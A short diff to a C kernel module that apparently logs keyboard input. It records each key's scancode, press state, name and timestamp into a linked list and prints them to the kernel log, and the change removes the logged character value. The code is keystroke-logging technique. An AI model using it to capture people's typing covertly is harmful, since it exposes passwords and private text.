@@ -45,25 +45,15 @@ t_keylst		*find_last_list_element(t_keylst *full_lst)
 		tmp_lst = tmp_lst->next;
 	return tmp_lst;
 }
-/*
-char			*strcpy(char *dest, const char *src)
-{
-	int i = -1;
 
-	while (src[++i])
-		dest[i] = src[i];
-	return dest;
-}
-*/
 t_keylst		*init_node(t_keylst *node, unsigned char scancode)
 {
 	node->key = scancode & KBD_SCANCODE_MASK;
 	node->state = scancode & KBD_STATUS_MASK;
 	strcpy(node->name, keyboard_name[scancode & KBD_SCANCODE_MASK]);
-	node->value = keyboard_map[scancode & KBD_SCANCODE_MASK];
 	getnstimeofday(&(node->time));
 	node->next = NULL;
-	printk(KERN_INFO "key [%d] state [%d] value [%c] name [%s] time [%ld]\n", node->key, node->state, node->value, node->name, node->time.tv_sec);
+	printk(KERN_INFO "key [%d] state [%d] name [%s] time [%ld]\n", node->key, node->state, node->name, node->time.tv_sec);
 	return node;
 }
 
